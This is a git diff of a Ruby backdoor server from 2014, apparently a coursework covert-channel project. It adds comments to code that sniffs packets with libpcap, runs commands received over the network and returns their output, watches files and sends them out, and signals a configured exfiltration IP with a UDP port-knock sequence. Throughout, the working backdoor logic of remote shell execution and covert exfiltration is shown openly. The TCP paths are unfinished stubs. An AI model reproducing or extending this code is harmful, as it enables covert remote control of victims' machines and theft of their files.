@@ -1,14 +1,22 @@
 #!/usr/bin/env ruby
 =begin
 -------------------------------------------------------------------------------------
--- SOURCE FILE:   server.rb - description goes here
+-- SOURCE FILE:   server.rb - Backdoor server. Runs discretely on targer computer
+--                            waiting to receive shell or watch commands from hacker.
+--                            Payloads are decrypted and information is transported
+--                            covertly.
 --
 -- PROGRAM:       server
 --                ./server.rb
 --
--- FUNCTIONS:     stuff here
+-- FUNCTIONS:     libpcap packet sniffing, remote shell, file monitoring,
+--                file transfer, backdoor, file I/O, packet crafting,
+--                encryption, decryption, port knocking, covert channels
 --
--- Ruby Gems req: 
+-- Ruby Gems req: packetfu
+--                https://rubygems.org/gems/packetfu
+--                fssm
+--                https://rubygems.org/gems/fssm
 -- 
 -- DATE:          May/June 2014
 --
@@ -22,6 +30,7 @@
 --                  before server receives both at the same time
 --                **watch functionality starts threads, no implemented interface
 --                  to manage or kill them
+--                ** TODO: all tcp implementations
 ---------------------------------------------------------------------------------------
 =end
 
@@ -53,6 +62,10 @@ FILE = "file"
 
 ## Functions
 
+# Starts the listening server for the backdoor. This is on libpcap filering on
+# the configuration from the conf file. if correct packets are found, the payloads
+# are parsed and executed depending on what was received.
+# Implemented protocols: TCP, UDP
 def start_listen_server
   puts "server listening on #{$cfg_iface}->#{$cfg_pen_protocol}:#{$cfg_pen_port}"
   #filter = "#{$cfg_pen_protocol} and dst port #{$cfg_pen_port}"
@@ -78,10 +91,9 @@ def start_listen_server
           case cmds[1]
           when MODE_SHELL
             cmd = cmds[2..-1].join(' ')
-            results = %x{ #{cmd} }
+            results = %x{ #{cmd} } #execute and store output
             send_out(:msg, results)
           when MODE_WATCH
-            puts "watch"
             if cmds[2] == DIR
               start_watch(DIR, cmds[3])
             elsif cmds[2] == FILE
@@ -89,7 +101,7 @@ def start_listen_server
             end
           end
         else
-          next #not auth, skip
+          next #not auth or not implemented protocol, skip
         end
       end
     end
@@ -100,23 +112,32 @@ def start_listen_server
   end
 end
 
+# Starts a monitor on a file or directory. Looks for creation
+# deletion, updates the "glob" or pattern provided in.
+# @param [String] type
+# - type of watch, dir or file
+# @param [String] name
+# - path to the dir or the file
 def start_watch(type, name)
   puts "start_watch"
   if type == DIR
     glob = '**/*'
+    path = name
   else
-    glob = name
+    #parse file from path
+    #glob = 
+    #path = 
   end
   t = Thread.new {
     begin
-      FSSM.monitor('/test', glob) do
+      FSSM.monitor(path, glob) do ############THIS IS BLOCKING??? fix this
         update { |base, relative|
           puts "#{base}/#{relative} has been updated"
           send_out(:file, "#{base}/#{relative}")
         }
         delete { |base, relative|
           puts "#{base}/#{relative} has been deleted"
-          send_out(:msg, "#{base}/#{relative}")
+          send_out(:msg, "#{base}/#{relative} has been deleted")
         }
         create { |base, relative|
           puts "#{base}/#{relative} has been created"
@@ -132,7 +153,13 @@ def start_watch(type, name)
   puts "watch on #{name} started"
 end
 
-#2 modes, message, file
+# Determins the method in which to send data to the client
+# and sends the knock sequence.
+# @param [Symbol] mode
+# - symbol for either file or message to determine method of transfer
+# @param [string] data
+# - if delete, message that its been deleted with path
+#   if update or create, passes the pathname to send file
 def send_out(mode, data)
   if mode == :file
     generate_knock_seq
@@ -140,10 +167,16 @@ def send_out(mode, data)
     generate_knock_seq
   else
     #should probs not get here
-  end
-        
+  end     
 end
 
+# Generates knock sequence to the configured protocol and client.
+# It provides the client with how the receiving server should be
+# configured on the payload.
+# Knock is on 3 ports.
+# Implemented protocols: TCP, UDP
+# UDP: 44444, 55555, 44544
+# TCP: tbd
 def generate_knock_seq
   puts "generating knock"
   begin
@@ -152,23 +185,23 @@ def generate_knock_seq
     puts "error in PF config"
     puts e.message
   end
-  convert_config = "#{$cfg_exfil_protocol},#{$cfg_exfil_port},#{$cfg_exfil_ttl}"
-  puts convert_config
+  covert_config = "#{$cfg_exfil_protocol},#{$cfg_exfil_port},#{$cfg_exfil_ttl}"
+  puts covert_config
 
   if $cfg_exfil_protocol == UDP
     begin
       3.times {
-        udp_packet(iface_config, 44444, convert_config)
+        udp_packet(iface_config, 44444, covert_config)
         sleep 0.2
       }
       sleep 2
       3.times {
-        udp_packet(iface_config, 55555, convert_config)
+        udp_packet(iface_config, 55555, covert_config)
         sleep 0.2
       }
       sleep 2
       3.times {
-        udp_packet(iface_config, 44544, convert_config)
+        udp_packet(iface_config, 44544, covert_config)
         sleep 0.2
       }
       sleep 5
@@ -178,11 +211,18 @@ def generate_knock_seq
     end
   elsif $cfg_exfil_protocol == TCP
   else
-    #should not get here
+    #should not get here, protocol not implemented
   end
       
 end
 
+# Crafts a UDP packet and sends to configured exfiltration IP.
+# @param [string] config
+# - PacketFu configration
+# @param [FixNum] port
+# - port to send to 
+# @param [string] payload
+# - configuration to include for client
 def udp_packet(config, port, payload)
   udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")
 
@@ -199,6 +239,13 @@ def udp_packet(config, port, payload)
   puts "udp packet sent #{$cfg_exfil_ip} on #{port}"
 end
 
+# Crafts a TCP packet and sends to configured exfiltration IP.
+# @param [string] config
+# - PacketFu configration
+# @param [FixNum] port
+# - port to send to 
+# @param [string] payload
+# - configuration to include for client
 def tcp_packet(config, port, payload)
 
 end
